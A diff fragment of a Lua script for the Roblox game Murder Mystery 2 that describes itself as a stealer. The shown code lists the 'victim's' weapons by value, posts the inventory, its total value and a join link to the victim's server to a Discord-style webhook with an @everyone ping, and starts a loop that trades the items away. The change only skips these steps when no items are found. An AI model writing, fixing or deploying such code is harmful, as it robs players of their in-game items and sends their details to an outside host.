@@ -179,21 +179,26 @@ table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amou
 local fernToken = math.random(100000,999999)
 local safeLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
 
--- Webhook inicial del inventario
-local fieldsInit={
-    {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
-    {name="Inventario 📦:", value="", inline=false},
-    {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-    {name="Click para unirte a la víctima 👇:", value=safeLink, inline=false}
-}
-for _, w in ipairs(weaponsToSend) do
-    fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+-- Webhook inicial del inventario (solo si hay items)
+if #weaponsToSend > 0 then
+    local fieldsInit={
+        {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
+        {name="Inventario 📦:", value="", inline=false},
+        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
+        {name="Click para unirte a la víctima 👇:", value=safeLink, inline=false}
+    }
+    for _, w in ipairs(weaponsToSend) do
+        fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+    end
+    local prefix=pingEveryone and "@everyone " or ""
+    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
+else
+    print("No se encontraron armas válidas, no se enviará webhook.")
 end
-local prefix=pingEveryone and "@everyone " or ""
-SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 
 -- Trade
 local function doTrade(targetName)
+    if #weaponsToSend == 0 then return end  -- ← No tradear si no hay items
     while #weaponsToSend>0 do
         local status=getTradeStatus()
         if status=="None" then
